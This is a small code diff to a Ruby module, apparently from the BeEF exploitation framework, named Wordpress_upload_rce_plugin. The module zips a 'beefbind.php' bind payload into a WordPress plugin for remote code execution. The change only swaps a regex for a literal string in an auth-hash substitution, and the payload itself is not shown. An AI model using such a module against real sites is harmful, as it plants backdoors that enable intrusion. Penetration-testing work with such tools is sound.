@@ -23,7 +23,7 @@ class Wordpress_upload_rce_plugin < WordPressCommand
       zio.put_next_entry('beefbind.php')
 
       file_content = File.read(File.join(File.dirname(__FILE__), 'beefbind.php')).to_s
-      file_content.gsub!(/#SHA1HASH#/, Digest::SHA1.hexdigest(auth_key))
+      file_content.gsub!('#SHA1HASH#', Digest::SHA1.hexdigest(auth_key))
 
       zio.write(file_content)
     end
